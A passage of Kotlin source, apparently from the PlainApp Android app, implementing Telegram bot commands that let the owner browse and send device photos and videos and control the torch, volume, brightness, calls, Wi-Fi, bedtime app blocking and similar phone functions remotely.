                sb.append("   📐 ${v.width}×${v.height}  ·  ⏱ ${mins}:${secs.toString().padStart(2, '0')}  ·  📦 ${humanSize(v.size)}\n\n")
                rows.add(listOf("📥 ${offset + i + 1}. ${v.title.take(28)}" to "vds_get:${pathToken(v.path)}"))
            }
            val nav = mutableListOf<Pair<String, String>>()
            val qTok = safeSeg(query.ifBlank { "_" })
            if (offset > 0) nav.add("◀️ Prev" to "vds_pg:$qTok:${(offset - pageSize).coerceAtLeast(0)}")
            if (hasMore) nav.add("Next ▶️" to "vds_pg:$qTok:${offset + pageSize}")
            if (nav.isNotEmpty()) rows.add(nav)
            val markup = TelegramApiClient.inlineKeyboard(rows)
            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
            else sendMessage(sb.toString(), replyMarkup = markup)
        } catch (e: Exception) {
            sendMessage("❌ Could not read videos: ${htmlEsc(e.message ?: "")}")
        }
    }

    private suspend fun cbSendMediaVideo(path: String) {
        val f = File(path)
        if (!f.exists() || !f.isFile) { sendMessage("❌ Video gone."); return }
        if (f.length() > UPLOAD_LIMIT_BYTES) { sendMessage("⚠️ Too large for Telegram (${humanSize(f.length())})."); return }
        sendUploadDocument()
        val ok = TelegramApiClient.sendVideo(token, chatId, f, "🎬 ${htmlEsc(f.name)}", 0)
        if (!ok) sendMessage("❌ Upload failed: <code>${htmlEsc(f.name)}</code>")
    }

    private suspend fun cmdImages(args: List<String>) {
        sendTyping()
        val q = if (args.isNotEmpty()) "text:${args.joinToString(" ")}" else ""
        renderImagesPage(q, 0, editMessageId = null)
    }

    private suspend fun renderImagesPage(query: String, offset: Int, editMessageId: Long?) {
        try {
            val pageSize = 5
            val items = ImageMediaStoreHelper.searchAsync(MainApp.instance, query, pageSize + 1, offset, FileSortBy.DATE_DESC)
            val hasMore = items.size > pageSize
            val pageItems = items.take(pageSize)
            if (pageItems.isEmpty()) {
                val msg = if (offset == 0) "🖼 No images found." else "🖼 No more images."
                if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg) else sendMessage(msg)
                return
            }

            // If paging from a callback, acknowledge the old nav message first
            if (editMessageId != null) {
                TelegramApiClient.editMessageText(token, chatId, editMessageId, "⏳ Loading page…")
            }

            sendUploadPhoto()

            // Build per-photo captions and create 400px thumbnails (kept in sync)
            val thumbFiles = mutableListOf<File>()
            val captions = mutableListOf<String>()
            pageItems.forEachIndexed { i, img ->
                val num = offset + i + 1
                val cap = "<b>${num}. ${htmlEsc(img.title.take(55))}</b>\n" +
                        "📐 ${img.width}×${img.height}  📦 ${humanSize(img.size)}\n" +
                        "🕐 ${fmtTime(img.createdAt.toEpochMilliseconds())}"
                val thumb = createImageThumbnail(img.path, 400)
                val fileToSend = thumb ?: run {
                    val orig = File(img.path)
                    if (orig.exists() && orig.length() < 10 * 1024 * 1024L) orig else null
                }
                if (fileToSend != null) {
                    thumbFiles.add(fileToSend)
                    captions.add(cap)
                }
            }

            // Send the album
            if (thumbFiles.isNotEmpty()) {
                TelegramApiClient.sendMediaGroup(token, chatId, thumbFiles, captions)
            }

            // Clean up temp thumbnails
            thumbFiles.forEach { f ->
                if (f.name.startsWith("tg_thumb_")) f.delete()
            }

            // Send nav message with download + page buttons
            val rows = mutableListOf<List<Pair<String, String>>>()
            pageItems.forEachIndexed { i, img ->
                rows.add(listOf("📥 ${offset + i + 1}. ${img.title.take(30)}" to "img_get:${pathToken(img.path)}"))
            }
            val nav = mutableListOf<Pair<String, String>>()
            val qTok = safeSeg(query.ifBlank { "_" })
            if (offset > 0) nav.add("◀️ Prev" to "img_pg:$qTok:${(offset - pageSize).coerceAtLeast(0)}")
            if (hasMore) nav.add("Next ▶️" to "img_pg:$qTok:${offset + pageSize}")
            if (nav.isNotEmpty()) rows.add(nav)
            val markup = TelegramApiClient.inlineKeyboard(rows)
            val header = "🖼 <b>Gallery</b> · ${offset + 1}–${offset + pageItems.size}\n<i>Tap a button to send the full-resolution photo.</i>"
            sendMessage(header, replyMarkup = markup)
        } catch (e: Exception) {
            sendMessage("❌ Could not read images: ${htmlEsc(e.message ?: "")}")
        }
    }

    private fun createImageThumbnail(sourcePath: String, maxPx: Int = 400): File? {
        return try {
            // Read bounds only first to compute sample size
            val bounds = android.graphics.BitmapFactory.Options().apply { inJustDecodeBounds = true }
            android.graphics.BitmapFactory.decodeFile(sourcePath, bounds)
            val w = bounds.outWidth; val h = bounds.outHeight
            if (w <= 0 || h <= 0) return null
            // Calculate sample size so decoded image is at most 2× target
            var sample = 1
            while ((w / sample) > maxPx * 2 || (h / sample) > maxPx * 2) sample *= 2
            val decOpts = android.graphics.BitmapFactory.Options().apply { inSampleSize = sample }
            val bmp = android.graphics.BitmapFactory.decodeFile(sourcePath, decOpts) ?: return null
            // Scale to exactly maxPx on the longest side
            val scale = minOf(1f, maxPx.toFloat() / maxOf(bmp.width, bmp.height))
            val tw = (bmp.width * scale).toInt().coerceAtLeast(1)
            val th = (bmp.height * scale).toInt().coerceAtLeast(1)
            val thumb = if (scale < 1f) android.graphics.Bitmap.createScaledBitmap(bmp, tw, th, true) else bmp
            if (thumb !== bmp) bmp.recycle()
            val f = File.createTempFile("tg_thumb_", ".jpg", MainApp.instance.cacheDir)
            java.io.FileOutputStream(f).use { out -> thumb.compress(android.graphics.Bitmap.CompressFormat.JPEG, 82, out) }
            thumb.recycle()
            f
        } catch (_: Throwable) { null }
    }

    private suspend fun cbSendMediaImage(path: String) {
        val f = File(path)
        if (!f.exists() || !f.isFile) { sendMessage("❌ Image gone."); return }
        if (f.length() > UPLOAD_LIMIT_BYTES) { sendMessage("⚠️ Too large for Telegram (${humanSize(f.length())})."); return }
        sendUploadPhoto()
        val ok = TelegramApiClient.sendPhoto(token, chatId, f, "🖼 ${htmlEsc(f.name)}")
        if (!ok) {
            // Photo can fail for huge images; fall back to document.
            val ok2 = TelegramApiClient.sendDocument(token, chatId, f, "🖼 ${htmlEsc(f.name)}")
            if (!ok2) sendMessage("❌ Upload failed: <code>${htmlEsc(f.name)}</code>")
        }
    }

    // ---------------- Pomodoro ----------------

    private suspend fun cmdPomodoro(args: List<String>) {
        val sub = args.firstOrNull()?.lowercase()
        when (sub) {
            "start", "go" -> {
                val secs = try { PomodoroSettingsPreference.getValueAsync(MainApp.instance).workDuration * 60 } catch (_: Throwable) { 25 * 60 }
                sendEvent(HttpApiEvents.PomodoroStartEvent(secs))
                renderPomodoroStatus(editMessageId = null)
            }
            "pause" -> { sendEvent(HttpApiEvents.PomodoroPauseEvent()); renderPomodoroStatus(editMessageId = null) }
            "stop", "reset" -> { sendEvent(HttpApiEvents.PomodoroStopEvent()); renderPomodoroStatus(editMessageId = null) }
            else -> renderPomodoroStatus(editMessageId = null)
        }
    }

    private suspend fun renderPomodoroStatus(editMessageId: Long?) {
        try {
            val settings = PomodoroSettingsPreference.getValueAsync(MainApp.instance)
            val today = com.ismartcoding.plain.helpers.TimeHelper.now()
                .toLocalDateTime(kotlinx.datetime.TimeZone.currentSystemDefault()).date.toString()
            val dao = com.ismartcoding.plain.db.AppDatabase.instance.pomodoroItemDao()
            val rec = try { dao.getByDate(today) } catch (_: Throwable) { null }
            val completed = rec?.completedCount ?: 0
            val sb = StringBuilder("🍅 <b>Pomodoro</b>\n")
            sb.append("━━━━━━━━━━━━━━━━━━━━\n")
            sb.append("📅 Today: <b>$today</b>\n")
            sb.append("✅ Completed: <b>$completed</b> sessions\n")
            sb.append("⏱ Work: ${settings.workDuration} min  ·  Short break: ${settings.shortBreakDuration} min  ·  Long break: ${settings.longBreakDuration} min\n")
            sb.append("🔁 Long break every: ${settings.pomodorosBeforeLongBreak} sessions\n\n")
            sb.append("<i>Tap below to control the timer on the device.</i>")
            val rows = listOf(
                listOf("▶️ Start" to "pom_start", "⏸ Pause" to "pom_pause"),
                listOf("⏹ Stop" to "pom_stop", "🔄 Refresh" to "pom_refresh"),
            )
            val markup = TelegramApiClient.inlineKeyboard(rows)
            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
            else sendMessage(sb.toString(), replyMarkup = markup)
        } catch (e: Exception) {
            sendMessage("❌ Pomodoro error: ${htmlEsc(e.message ?: "")}")
        }
    }

    // ---------------- Torch ----------------

    private suspend fun cmdTorch(args: List<String>) {
        val sub = args.firstOrNull()?.lowercase()
        try {
            when (sub) {
                "on", "1", "true" -> UtilitiesHelper.setTorch(true)
                "off", "0", "false" -> UtilitiesHelper.setTorch(false)
                "toggle" -> UtilitiesHelper.setTorch(!UtilitiesHelper.isTorchOn())
                null, "" -> { /* just show state */ }
                else -> { sendMessage("Usage: /torch [on|off|toggle]"); return }
            }
        } catch (e: Exception) {
            sendMessage("❌ Torch failed: ${htmlEsc(e.message ?: "")}")
            return
        }
        renderTorchState(editMessageId = null)
    }

    private suspend fun renderTorchState(editMessageId: Long?) {
        val on = try { UtilitiesHelper.isTorchOn() } catch (_: Throwable) { false }
        val sb = StringBuilder("🔦 <b>Flashlight</b>\n━━━━━━━━━━━━━━━━━━━━\n")
        sb.append("State: <b>${if (on) "🟢 ON" else "⚪ OFF"}</b>")
        val rows = listOf(listOf("🔦 ON" to "torch_on", "⚪ OFF" to "torch_off"))
        val markup = TelegramApiClient.inlineKeyboard(rows)
        if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
        else sendMessage(sb.toString(), replyMarkup = markup)
    }

    // ---------------- Speak / Vibrate / Show / Wake ----------------

    private suspend fun cmdSpeak(text: String) {
        val say = text.trim()
        if (say.isEmpty()) {
            pendingInput = "speak_text"
            sendMessage("🗣 <b>Text-to-speech</b>\n\nReply with the text to speak on the device.\nSend any /command to cancel.")
            return
        }
        UtilitiesHelper.speak(say)
        sendMessage("🗣 Speaking on device:\n<i>${htmlEsc(say.take(200))}</i>")
    }

    private suspend fun cmdVibrate(args: List<String>) {
        val secs = args.firstOrNull()?.toIntOrNull() ?: 1
        val ms = (secs.coerceIn(1, 10)) * 1000L
        UtilitiesHelper.vibrate(ms)
        sendMessage("📳 Vibrating for ${ms / 1000}s")
    }

    private suspend fun cmdFindPhone(args: List<String>) {
        when (args.firstOrNull()?.lowercase()) {
            "on", "start" -> { LocateRingService.start(); renderFindPhoneState(editMessageId = null) }
            "off", "stop" -> { LocateRingService.stop(); renderFindPhoneState(editMessageId = null) }
            else -> renderFindPhoneState(editMessageId = null)
        }
    }

    private suspend fun renderFindPhoneState(editMessageId: Long?) {
        val running = LocateRingService.running
        val sb = StringBuilder("🚨 <b>Locate phone</b>\n━━━━━━━━━━━━━━━━━━━━\n")
        sb.append("State: <b>${if (running) "🚨 RINGING" else "🔕 OFF"}</b>\n\n")
        sb.append("<i>The device will play a loud alarm sound at full volume to help you find it.</i>")
        val rows = listOf(listOf("🚨 Start alarm" to "fp_on", "🔕 Stop" to "fp_off"))
        val markup = TelegramApiClient.inlineKeyboard(rows)
        if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
        else sendMessage(sb.toString(), replyMarkup = markup)
    }

    private suspend fun cmdShow(text: String) {
        val msg = text.trim()
        if (msg.isEmpty()) {
            pendingInput = "show_text"
            sendMessage("💡 <b>Show banner on device</b>\n\nReply with the message to show as a screen overlay.\nSend any /command to cancel.")
            return
        }
        if (!android.provider.Settings.canDrawOverlays(MainApp.instance)) {
            sendMessage("⛔ Display-over-other-apps permission is not granted. Enable it for PlainApp first.")
            return
        }
        MessageOverlayService.show(title = "PlainApp", message = msg, durationMs = 5000L, blocking = false)
        sendMessage("💡 Banner shown on device:\n<i>${htmlEsc(msg.take(200))}</i>")
    }

    private suspend fun cmdWake(args: List<String>) {
        val secs = (args.firstOrNull()?.toIntOrNull() ?: 10).coerceIn(1, 120)
        UtilitiesHelper.wakeScreen(secs * 1000L)
        sendMessage("📺 Screen woken for ${secs}s.")
    }

    // ---------------- Brightness / Volume ----------------

    private suspend fun cmdBrightness(args: List<String>) {
        val pct = args.firstOrNull()?.toIntOrNull()
        if (pct == null) { renderBrightnessState(editMessageId = null); return }
        val ok = UtilitiesHelper.setBrightness(pct.coerceIn(0, 100))
        if (!ok) { sendMessage("⛔ WRITE_SETTINGS permission not granted. Enable it for PlainApp first."); return }
        renderBrightnessState(editMessageId = null)
    }

    private suspend fun renderBrightnessState(editMessageId: Long?) {
        val cur = try { UtilitiesHelper.getBrightness() } catch (_: Throwable) { 0 }
        val sb = StringBuilder("🔆 <b>Brightness</b>\n━━━━━━━━━━━━━━━━━━━━\n")
        sb.append("Current: <b>${cur}%</b>\n\n<i>Tap a preset to change.</i>")
        val rows = listOf(
            listOf("0%" to "br_set:0", "25%" to "br_set:25", "50%" to "br_set:50"),
            listOf("75%" to "br_set:75", "100%" to "br_set:100"),
        )
        val markup = TelegramApiClient.inlineKeyboard(rows)
        if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
        else sendMessage(sb.toString(), replyMarkup = markup)
    }

    private suspend fun cmdVolume(args: List<String>) {
        val a0 = args.getOrNull(0)?.lowercase()
        val a1 = args.getOrNull(1)?.toIntOrNull()
        if (a0 != null && a1 != null) {
            UtilitiesHelper.setVolume(a0, a1.coerceIn(0, 100))
        } else if (a0 != null && args.size == 1 && a0.toIntOrNull() != null) {
            UtilitiesHelper.setVolume("media", a0.toInt().coerceIn(0, 100))
        }
        renderVolumeState(editMessageId = null)
    }

    private suspend fun renderVolumeState(editMessageId: Long?) {
        val v = try { UtilitiesHelper.getVolumes() } catch (_: Throwable) { emptyMap() }
        val sb = StringBuilder("🔊 <b>Volume Levels</b>\n━━━━━━━━━━━━━━━━━━━━\n")
        v.forEach { (k, p) -> sb.append("• <b>$k</b>: ${p}%\n") }
        sb.append("\n<i>Tap a preset to change media volume.</i>")
        val rows = listOf(
            listOf("🔇 0%" to "vol_set:media:0", "25%" to "vol_set:media:25", "50%" to "vol_set:media:50"),
            listOf("75%" to "vol_set:media:75", "🔊 100%" to "vol_set:media:100"),
            listOf("📞 Ring 50%" to "vol_set:ring:50", "🔔 Notif 50%" to "vol_set:notification:50"),
        )
        val markup = TelegramApiClient.inlineKeyboard(rows)
        if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
        else sendMessage(sb.toString(), replyMarkup = markup)
    }

    // ---------------- Launch app ----------------

    private suspend fun cmdLaunch(args: List<String>) {
        if (args.isEmpty()) { renderLaunchAppsPage("", 0, editMessageId = null); return }
        val arg = args.joinToString(" ")
        // Direct launch if it looks like a package name
        if (arg.contains('.') && !arg.contains(' ')) {
            val ok = AppLauncherHelper.launch(arg)
            if (ok) { sendMessage("🚀 Launched <code>${htmlEsc(arg)}</code> on the device."); return }
        }
        renderLaunchAppsPage(arg.lowercase(), 0, editMessageId = null)
    }

    private suspend fun renderLaunchAppsPage(query: String, offset: Int, editMessageId: Long?) {
        try {
            val all = AppLauncherHelper.list(MainApp.instance, query).filter { it.launchable }
            val pageSize = 10
            val pageItems = all.drop(offset).take(pageSize)
            if (pageItems.isEmpty()) {
                val msg = if (offset == 0) "🚀 No launchable apps match <code>${htmlEsc(query)}</code>" else "🚀 No more apps."
                if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg) else sendMessage(msg)
                return
            }
            val sb = StringBuilder("🚀 <b>Launch app</b> · ${offset + 1}–${offset + pageItems.size} of ${all.size}\n<i>Tap an app to open it on the device.</i>\n\n")
            val rows = mutableListOf<List<Pair<String, String>>>()
            pageItems.forEachIndexed { i, a ->
                sb.append("${offset + i + 1}. 📱 <b>${htmlEsc(a.label)}</b>\n   <code>${htmlEsc(a.packageName)}</code>\n\n")
                rows.add(listOf("${offset + i + 1}. ${a.label.take(34)}" to "lrun:${pkgToken(a.packageName)}"))
            }
            val nav = mutableListOf<Pair<String, String>>()
            val qTok = safeSeg(query.ifBlank { "_" })
            if (offset > 0) nav.add("◀️ Prev" to "lpg:$qTok:${(offset - pageSize).coerceAtLeast(0)}")
            if (offset + pageSize < all.size) nav.add("Next ▶️" to "lpg:$qTok:${offset + pageSize}")
            if (nav.isNotEmpty()) rows.add(nav)
            val markup = TelegramApiClient.inlineKeyboard(rows)
            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
            else sendMessage(sb.toString(), replyMarkup = markup)
        } catch (e: Exception) {
            sendMessage("❌ Could not list apps: ${htmlEsc(e.message ?: "")}")
        }
    }

    // ---------------- Stop TTS / Toast / Mobile-data deep-link ----------------

    private fun cmdStopSpeak() {
        UtilitiesHelper.stopSpeaking()
        sendMessage("🤫 Stopped speaking.")
    }

    private suspend fun cmdToast(text: String) {
        val msg = text.trim()
        if (msg.isEmpty()) {
            pendingInput = "toast_text"
            sendMessage("💬 <b>Toast on device</b>\n\nReply with the text to flash on the device screen.\nSend any /command to cancel.")
            return
        }
        UtilitiesHelper.toast(msg, longToast = msg.length > 40)
        sendMessage("💬 Toast shown on device:\n<i>${htmlEsc(msg.take(200))}</i>")
    }

    private fun cmdDataSettings() {
        val ok = UtilitiesHelper.openDataSettings()
        if (ok) sendMessage("📡 Opened mobile-data settings on the device.")
        else sendMessage("❌ Could not open the settings page.")
    }

    // ---------------- Bedtime (parental control) ----------------

    private suspend fun cmdBedtime(args: List<String>) {
        when (args.firstOrNull()?.lowercase()) {
            "off", "stop", "disable" -> {
                val cur = com.ismartcoding.plain.services.AppBlockHelper.getBedtime()
                com.ismartcoding.plain.services.AppBlockHelper.setBedtime(
                    com.ismartcoding.plain.services.AppBlockHelper.Bedtime(false, cur.startMinutes, cur.endMinutes, cur.packages)
                )
                renderBedtimeState(editMessageId = null)
            }
            "on", "start", "enable" -> {
                val cur = com.ismartcoding.plain.services.AppBlockHelper.getBedtime()
                com.ismartcoding.plain.services.AppBlockHelper.setBedtime(
                    com.ismartcoding.plain.services.AppBlockHelper.Bedtime(true, cur.startMinutes, cur.endMinutes, cur.packages)
                )
                renderBedtimeState(editMessageId = null)
            }
            "set" -> {
                // /bedtime set 22:00 06:30
                val rest = args.drop(1).joinToString(" ").trim()
                val ok = parseAndApplyBedtime(rest)
                if (ok) renderBedtimeState(editMessageId = null)
                else {
                    pendingInput = "bedtime_set"
                    sendMessage("🌙 <b>Set bedtime window</b>\n\nReply with the start and end in 24-hour format, e.g. <code>22:00 06:30</code>.\nSend <code>off</code> to disable.")
                }
            }
            else -> renderBedtimeState(editMessageId = null)
        }
    }

    /**
     * Accepts "HH:MM HH:MM" or "off"/"disable". Returns true if it parsed and was applied.
     * Preserves the existing package allow-list — bedtime only blocks the packages already
     * configured from the web panel.
     */
    private fun parseAndApplyBedtime(raw: String): Boolean {
        val s = raw.trim().lowercase()
        val cur = com.ismartcoding.plain.services.AppBlockHelper.getBedtime()
        if (s == "off" || s == "disable" || s == "stop") {
            com.ismartcoding.plain.services.AppBlockHelper.setBedtime(
                com.ismartcoding.plain.services.AppBlockHelper.Bedtime(false, cur.startMinutes, cur.endMinutes, cur.packages)
            )
            return true
        }
        val tokens = s.split(Regex("\\s+|to|-|,")).filter { it.isNotBlank() }
        if (tokens.size < 2) return false
        val start = parseHm(tokens[0]) ?: return false
        val end = parseHm(tokens[1]) ?: return false
        com.ismartcoding.plain.services.AppBlockHelper.setBedtime(
            com.ismartcoding.plain.services.AppBlockHelper.Bedtime(true, start, end, cur.packages)
        )
        return true
    }

    private fun parseHm(t: String): Int? {
        val parts = t.split(":")
        if (parts.size != 2) return null
        val h = parts[0].toIntOrNull() ?: return null
        val m = parts[1].toIntOrNull() ?: return null
        if (h !in 0..23 || m !in 0..59) return null
        return h * 60 + m
    }

    private fun fmtHm(minutes: Int): String =
        "%02d:%02d".format((minutes / 60).coerceIn(0, 23), (minutes % 60).coerceIn(0, 59))

    private suspend fun renderBedtimeState(editMessageId: Long?) {
        val b = com.ismartcoding.plain.services.AppBlockHelper.getBedtime()
        val sb = StringBuilder("🌙 <b>Bedtime</b>\n━━━━━━━━━━━━━━━━━━━━\n")
        sb.append("State: <b>${if (b.enabled) "🟢 ON" else "⚪ OFF"}</b>\n")
        sb.append("Window: <b>${fmtHm(b.startMinutes)} → ${fmtHm(b.endMinutes)}</b>\n")
        sb.append("Apps in scope: <b>${b.packages.size}</b>")
        if (b.packages.isNotEmpty()) {
            sb.append("\n<i>${htmlEsc(b.packages.take(8).joinToString(", "))}${if (b.packages.size > 8) "…" else ""}</i>")
        }
        sb.append("\n\n<i>The bedtime app list is managed from the web panel.</i>")
        val rows = listOf(
            listOf("🟢 Enable" to "bt_on", "⚪ Disable" to "bt_off"),
            listOf("🌃 22:00–06:00" to "bt_w:1320:360", "🌃 23:00–07:00" to "bt_w:1380:420"),
            listOf("📚 21:00–06:30" to "bt_w:1260:390", "✏️ Custom…" to "bt_custom"),
        )
        val markup = TelegramApiClient.inlineKeyboard(rows)
        if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
        else sendMessage(sb.toString(), replyMarkup = markup)
    }

    // ---------------- App launch history ----------------

    private suspend fun cmdLaunches(args: List<String>) {
        val n = (args.firstOrNull()?.toIntOrNull() ?: 25).coerceIn(1, 200)
        val list = com.ismartcoding.plain.services.AppBlockHelper.getHistory().asReversed().take(n)
        if (list.isEmpty()) { sendMessage("🚀 No app launches recorded yet."); return }
        val sb = StringBuilder("🚀 <b>Recent app launches</b> · last ${list.size}\n━━━━━━━━━━━━━━━━━━━━\n")
        list.forEachIndexed { i, h ->
            val name = try { com.ismartcoding.plain.features.PackageHelper.getLabel(h.pkg).ifEmpty { h.pkg } }
                       catch (_: Throwable) { h.pkg }
            sb.append("${i + 1}. <b>${htmlEsc(name)}</b>\n")
            sb.append("   <code>${htmlEsc(h.pkg)}</code> · 🕐 ${fmtTime(h.ts)}\n\n")
        }
        val markup = TelegramApiClient.inlineKeyboard(listOf(
            listOf("🗑 Clear history" to "launches_clear", "🔄 Refresh" to "launches_refresh"),
        ))
        sendMessage(sb.toString(), replyMarkup = markup)
    }

    // ---------------- Live call hub ----------------

    private suspend fun cmdLiveCall() {
        renderLiveCallState(editMessageId = null)
    }

    private suspend fun renderLiveCallState(editMessageId: Long?) {
        val s = com.ismartcoding.plain.services.LiveCallTracker.snapshot()
        val sb = StringBuilder("📞 <b>Live call hub</b>\n━━━━━━━━━━━━━━━━━━━━\n")
        val emoji = when (s.state) {
            "ringing" -> "📲"
            "active" -> "🟢"
            "ended" -> "⚪"
            else -> "⚪"
        }
        sb.append("State: <b>$emoji ${s.state.uppercase()}</b>\n")
        if (s.state != "idle") {
            sb.append("Direction: <b>${s.direction}</b>\n")
            sb.append("Source: <b>${htmlEsc(if (s.appName.isNotBlank()) s.appName else s.source)}</b>\n")
            if (s.display.isNotBlank()) {
                val contactName = lookupContactName(s.display)
                if (contactName.isNotBlank()) {
                    sb.append("Who: <b>${htmlEsc(contactName)}</b>\n")
                    sb.append("📱 <code>${htmlEsc(s.display)}</code>\n")
                } else {
                    sb.append("Who: <b>${htmlEsc(s.display)}</b>\n")
                }
            }
            if (s.acceptedAt > 0) {
                val secs = ((com.ismartcoding.plain.helpers.TimeHelper.now().toEpochMilliseconds() - s.acceptedAt) / 1000).coerceAtLeast(0)
                sb.append("Duration: <b>${secs / 60}m ${secs % 60}s</b>\n")
            } else if (s.startedAt > 0) {
                sb.append("Since: 🕐 ${fmtTime(s.startedAt)}\n")
            }
            sb.append("Mute: <b>${if (s.muted) "🔇 muted" else "🎙 live"}</b>")
            if (s.silenced) sb.append("  ·  <i>silenced by Android</i>")
            sb.append("\n")
        } else {
            sb.append("\n<i>No call in progress.</i>")
        }
        val rows = mutableListOf<List<Pair<String, String>>>()
        if (s.state == "ringing") {
            rows.add(listOf("✅ Accept" to "lc_accept", "🔚 End" to "lc_end"))
        } else if (s.state == "active") {
            rows.add(listOf(
                if (s.muted) "🎙 Unmute" to "lc_unmute" else "🔇 Mute" to "lc_mute",
                "🔚 End" to "lc_end",
            ))
        }
        rows.add(listOf("🔄 Refresh" to "lc_refresh"))
        val markup = TelegramApiClient.inlineKeyboard(rows)
        if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
        else sendMessage(sb.toString(), replyMarkup = markup)
    }

    // ---------------- Wi-Fi ----------------

    private suspend fun cmdWifi(args: List<String>) {
        when (args.firstOrNull()?.lowercase()) {
            "on", "1", "true" -> WifiControlHelper.setWifiEnabled(true, MainApp.instance)
            "off", "0", "false" -> WifiControlHelper.setWifiEnabled(false, MainApp.instance)
            else -> { /* show state */ }
        }
        renderWifiState(editMessageId = null)
    }

    private suspend fun renderWifiState(editMessageId: Long?) {
        try {
            val s = WifiControlHelper.state(MainApp.instance)
            val sb = StringBuilder("📶 <b>Wi-Fi</b>\n━━━━━━━━━━━━━━━━━━━━\n")
            sb.append("State: <b>${if (s.enabled) "🟢 ON" else "⚪ OFF"}</b>\n")
            if (s.enabled) {
                if (s.connectedSsid.isNotBlank()) sb.append("Network: <b>${htmlEsc(s.connectedSsid)}</b>\n")
                if (s.ipv4.isNotBlank()) sb.append("IP: <code>${s.ipv4}</code>\n")
                if (s.linkSpeedMbps > 0) sb.append("Speed: ${s.linkSpeedMbps} Mbps\n")
                if (s.rssi > -127) sb.append("Signal: ${s.rssi} dBm\n")
                if (s.frequencyMhz > 0) sb.append("Freq: ${s.frequencyMhz} MHz\n")
            }
            sb.append("Hotspot: ${s.hotspotState}\n")
            val rows = listOf(listOf("🟢 Turn ON" to "wifi_on", "⚪ Turn OFF" to "wifi_off"))
            val markup = TelegramApiClient.inlineKeyboard(rows)
            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
            else sendMessage(sb.toString(), replyMarkup = markup)
        } catch (e: Exception) {
            sendMessage("❌ Wi-Fi error: ${htmlEsc(e.message ?: "")}")
        }
    }

    // ---------------- Network usage ----------------

    private suspend fun cmdNetUsage(args: List<String>) {
        val days = (args.firstOrNull()?.toIntOrNull() ?: 7).coerceIn(1, 90)
        sendTyping()
        try {
            if (!NetworkUsageHelper.usageAccessGranted(MainApp.instance)) {
                sendMessage("⛔ Network usage requires the <b>Usage Access</b> permission.\nGrant it for PlainApp in Android Settings → Special Access → Usage Access.")
                return
            }
            val w = NetworkUsageHelper.query(days, MainApp.instance)
            val sb = StringBuilder("📊 <b>Network usage</b> · last $days day(s)\n━━━━━━━━━━━━━━━━━━━━\n")
            sb.append("📥 Total RX: <b>${humanSize(w.totalRx)}</b>\n")
            sb.append("📤 Total TX: <b>${humanSize(w.totalTx)}</b>\n\n")
            sb.append("<b>Top apps:</b>\n")
            w.apps.take(15).forEachIndexed { i, app ->
                sb.append("${i + 1}. <b>${htmlEsc(app.label.take(30))}</b>  ·  ${humanSize(app.rxBytes + app.txBytes)}\n")
                sb.append("   📶 Wi-Fi ${humanSize(app.rxBytesWifi + app.txBytesWifi)}  ·  📡 Mobile ${humanSize(app.rxBytesMobile + app.txBytesMobile)}\n")
            }
            sendMessage(sb.toString())
        } catch (e: Exception) {
            sendMessage("❌ Net usage error: ${htmlEsc(e.message ?: "")}")
        }
    }

    // ==================== /storage ====================

    private fun cmdStorage() {
        sendTyping()
        try {
            val ctx = MainApp.instance
            val internal = FileSystemHelper.getInternalStorageStats()
            val sb = StringBuilder("💾 <b>Storage</b>\n━━━━━━━━━━━━━━━━━━━━\n")
            fun formatLine(label: String, s: com.ismartcoding.plain.features.file.DStorageStatsItem) {
                val used = s.totalBytes - s.freeBytes
                val pct = if (s.totalBytes > 0) (used * 100 / s.totalBytes).toInt() else 0
                val bar = "█".repeat(pct / 10) + "░".repeat(10 - pct / 10)
                sb.append("$label\n")
                sb.append("  $bar $pct%\n")
                sb.append("  Used: <b>${humanSize(used)}</b>  Free: <b>${humanSize(s.freeBytes)}</b>  Total: ${humanSize(s.totalBytes)}\n\n")
            }
            formatLine("📱 Internal", internal)
            val sd = FileSystemHelper.getSDCardStorageStats(ctx)
            if (sd.totalBytes > 0) formatLine("💳 SD Card", sd)
            val usbs = FileSystemHelper.getUSBStorageStats()
            usbs.forEachIndexed { i, u -> if (u.totalBytes > 0) formatLine("🔌 USB ${i + 1}", u) }
            sendMessage(sb.toString())
        } catch (e: Exception) {
            sendMessage("❌ Storage error: ${htmlEsc(e.message ?: "")}")
        }
    }

    // ==================== /sim ====================

    private fun cmdSim() {
        sendTyping()
        try {
            val sims = SimHelper.getAll()
            if (sims.isEmpty()) {
                sendMessage("📡 No SIM cards detected.")
                return
            }
            val sb = StringBuilder("📡 <b>SIM Cards</b>\n━━━━━━━━━━━━━━━━━━━━\n")
            sims.forEachIndexed { i, s ->
                sb.append("${i + 1}. 📶 <b>${htmlEsc(s.label.ifBlank { "SIM ${i + 1}" })}</b>\n")
                sb.append("   📱 <code>${htmlEsc(s.number.ifBlank { "(number hidden)" })}</code>\n\n")
            }
            sendMessage(sb.toString())
        } catch (e: Exception) {
            sendMessage("❌ SIM error: ${htmlEsc(e.message ?: "")}")
        }
    }

    // ==================== /dnd ====================

    private fun cmdDnd(args: List<String>) {
        val nm = MainApp.instance.getSystemService(android.content.Context.NOTIFICATION_SERVICE) as android.app.NotificationManager
        if (!nm.isNotificationPolicyAccessGranted) {
            sendMessage("❌ DND access not granted.\n\nGo to <b>Settings → Apps → Special app access → Do Not Disturb access</b> and enable PlainApp.")
            return
        }
        val currentOn = nm.currentInterruptionFilter == android.app.NotificationManager.INTERRUPTION_FILTER_NONE
        val setOn = when (args.firstOrNull()?.lowercase()) {
            "on", "1", "true", "enable" -> true
